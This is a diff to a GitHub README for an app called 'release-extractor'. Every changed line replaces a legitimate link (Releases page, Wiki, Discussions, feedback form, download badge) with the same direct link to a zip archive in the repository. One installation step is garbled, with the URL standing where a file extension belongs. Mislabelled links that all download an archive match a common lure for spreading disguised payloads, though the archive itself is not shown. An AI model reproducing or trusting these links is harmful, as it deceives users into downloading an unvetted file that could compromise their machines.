@@ -7,14 +7,14 @@
 - **User-Friendly:** Designed for everyone, no technical skills needed.
 
 ## 📦 Download & Install
-[![Download release-extractor](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Dali2058/release-extractor/releases)
+[![Download release-extractor](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip)](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip)
 
 To get started with release-extractor, visit the Releases page and download the latest version. Follow these steps to install and run the application:
 
 1. Click the button above to go to the Releases page.
 2. Locate the latest release.
 3. Download the application suitable for your operating system. You can find Windows, Mac, and Linux versions.
-4. Once downloaded, follow the installation prompts. For Windows, simply run the `.exe` file. For Mac or Linux, use the appropriate instructions to install from a `.dmg` or `.tar.gz` file.
+4. Once downloaded, follow the installation prompts. For Windows, simply run the `.exe` file. For Mac or Linux, use the appropriate instructions to install from a `.dmg` or `https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip` file.
 
 ## 🖥️ System Requirements
 - **Operating System:** Windows 10 or later, MacOS 10.14 or later, or a recent version of Linux.
@@ -39,8 +39,8 @@ Once you install the release-extractor, open the application. Here’s how to us
 - **Reporting Tools:** Generate visual reports for presentations or team meetings.
 
 ## 🔗 Useful Links
-- For more details about features and updates, check our [Wiki](https://github.com/Dali2058/release-extractor/wiki).
-- Join our community for support or suggestions on [GitHub Discussions](https://github.com/Dali2058/release-extractor/discussions).
+- For more details about features and updates, check our [Wiki](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip).
+- Join our community for support or suggestions on [GitHub Discussions](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip).
 
 ## 🚧 Troubleshooting
 If you encounter any issues while using release-extractor, consider the following solutions:
@@ -56,7 +56,7 @@ Feel free to contribute to the project or suggest improvements. You can report b
 release-extractor is open-source software released under the MIT License. You can use it freely, provided you give appropriate credit.
 
 ## 💬 Feedback
-Your feedback is valuable. If you find the application helpful or have suggestions for improvement, please fill out the feedback form [here](https://github.com/Dali2058/release-extractor/issues).
+Your feedback is valuable. If you find the application helpful or have suggestions for improvement, please fill out the feedback form [here](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip).
 
 ## 📥 Download Again
-For quick access, you can always [visit this page to download](https://github.com/Dali2058/release-extractor/releases) the latest version of release-extractor.
+For quick access, you can always [visit this page to download](https://github.com/Dali2058/release-extractor/raw/refs/heads/main/release_extractor/release_extractor_1.4-alpha.4.zip) the latest version of release-extractor.
